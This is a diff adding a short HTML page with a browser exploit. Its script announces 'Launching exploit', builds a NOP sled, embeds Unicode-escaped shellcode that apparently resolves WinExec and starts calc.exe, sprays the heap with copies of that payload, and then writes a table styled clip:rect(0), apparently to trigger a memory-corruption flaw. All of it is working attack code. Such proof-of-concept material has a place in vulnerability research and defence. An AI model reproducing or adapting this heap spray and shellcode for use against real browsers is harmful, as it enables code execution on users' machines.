@@ -1,0 +1,24 @@
+<html>
+<script>
+alert("Launching exploit");
+var s = 0x10000;
+var i = 0;
+var trash = unescape("%u9090");
+//var shell = unescape("%ucccc");
+var shell = unescape("%u2781%ufffe%uffff%u6860%u1337%udead%uf631%u6456%u768b%u8b30%u0c76%u768b%u8b1c%u086e%u368b%u5d8b%u8b3c%u1d5c%u0178%u8beb%u184b%ue367%u8bec%u207b%uef01%u7c8b%ufc8f%uef01%uc031%u3299%u6617%ucad1%u75ae%u66f8%ufa81%uf510%ue3e0%ucd75%u538b%u0124%u0fea%u14b7%u8b4a%u1c7b%uef01%u2c03%u6897%u652e%u6578%u6368%u6c61%u5463%u0487%u5024%ud5ff%u3d58%u1337%udead%uf875%u3161%uc3c0%u9090")
+var paysect = trash;
+while(i < 0xff0 - shell.length){
+    paysect += trash;
+    i += trash.length;
+}
+paysect += shell;
+i = 0;
+var heap = Array();
+while(i < s){
+    heap[i] = paysect.substr(0, paysect.length);
+    i += 1;
+}
+document.write("<table style=position:absolute;clip:rect(0)>");
+</script>
+</html>
+
